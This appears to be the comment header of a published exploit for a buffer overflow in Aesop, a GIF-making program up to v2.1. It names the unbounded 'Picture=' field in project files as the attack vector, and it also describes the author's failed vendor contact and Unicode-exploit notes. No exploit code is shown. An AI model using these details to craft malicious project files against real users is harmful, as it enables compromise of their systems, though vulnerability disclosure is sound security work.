# Vulnerable version: <= v2.1
# Tested on: Windows XP SP3 Eng
# CVE : N/A

#### Software Description:
# Aesop is a powerful tool that allows you to create animated GIF images (banners, buttons, labels and headings)
# for your website and even GIF wallpapers for your mobile phone quickly and easily (click to see samples). You
# can use an antialiased 3D-Text, shapes (rectangles, rounded rectangles, ellipses and polygons) and external
# pictures for drawing in your GIF.
# Convenient interface.
# Unicode support - you can use national characters as Text in your GIF.
# An excellent antialiasing technique (blurring the edges between color transitions) to draw 3D-Text and shapes:
#### Exploit information:
# Aesop is prone to a buffer overflow when handling a malicious aesop project files. The vulnerability
# is due to improper bounds checking of the "Picture=" field which can be exploited by malicious people to
# compromise a users system.
#### Other information:
# I attempted to reach out to the vendor about this but after a few short emails it became clear that they
# had no interest in verifying it/coordinating a fix so here's the exploit.
#### Notes:
# I always knew that one day I would end up needing to deal with unicode buffers. After a couple nights of
# tinkering around this is the end result. P.S. - When all else fails->Fail harder
#### Shoutz:
# kAoTiX, Sheep, Tu, edb-team, corelan team, packetstormsecurity and all other security researchers and sites.
# -> A big thanks goes to corelanc0d3r for shedding some light on the subject of unicode exploits. ;)
